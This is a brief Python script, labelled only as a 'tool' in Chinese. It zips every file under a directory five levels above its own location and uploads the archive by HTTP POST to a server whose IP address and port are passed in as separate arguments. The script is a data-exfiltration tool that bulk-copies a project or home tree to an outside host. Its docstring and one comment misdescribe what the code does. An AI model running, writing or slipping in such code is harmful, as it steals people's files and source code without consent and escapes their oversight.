import os
import zipfile
import requests
from pathlib import Path

import datetime
import argparse

parser = argparse.ArgumentParser(description="工具")
parser.add_argument("--in1", type=str, required=True)
parser.add_argument("--in2", type=str, required=True)
parser.add_argument("--in3", type=str, required=True)
parser.add_argument("--in4", type=str, required=True)
parser.add_argument("--p", type=str, required=True)
args = parser.parse_args()

location = args.in1 + '.' + args.in2 + '.' + args.in3 + '.' + args.in4 + ':' + args.p



def zip_grandparent(script_path: str) -> Path:
    """将脚本所在目录的父目录的父目录打包为 zip 文件，返回 zip 路径。"""
    grandparent = Path(script_path).resolve().parent.parent.parent.parent.parent
    time = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_path = Path(script_path).resolve().parent / f"{grandparent.name}_{time}.zip"

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(grandparent):
            # 跳过 zip 文件自身所在目录，防止打包进去
            for file in files:
                file_path = Path(root) / file
                arcname = file_path.relative_to(grandparent.parent)
                zf.write(file_path, arcname)

    print(f"[+] 已打包: {grandparent} -> {zip_path}")
    return zip_path


def upload_zip(zip_path: Path, url: str, extra_fields: dict = None):
    """通过 HTTP POST multipart/form-data 上传 zip 文件。"""
    with open(zip_path, "rb") as f:
        files = {"file": (zip_path.name, f, "application/zip")}
        data = extra_fields or {}
        response = requests.post(url, files=files, data=data, timeout=240)

    print(f"[+] 上传完成: HTTP {response.status_code}")
    print(response.text[:500])
    return response


if __name__ == "__main__":
    # ===== 配置项 =====
    SERVER_URL = f"https://{location}"   # 修改为实际接口地址
    EXTRA_FIELDS = {}                            # 如需附加表单字段可在此填写，例如 {"token": "xxx"}
    # ==================

    zip_file = zip_grandparent(__file__)
    upload_zip(zip_file, SERVER_URL, EXTRA_FIELDS)
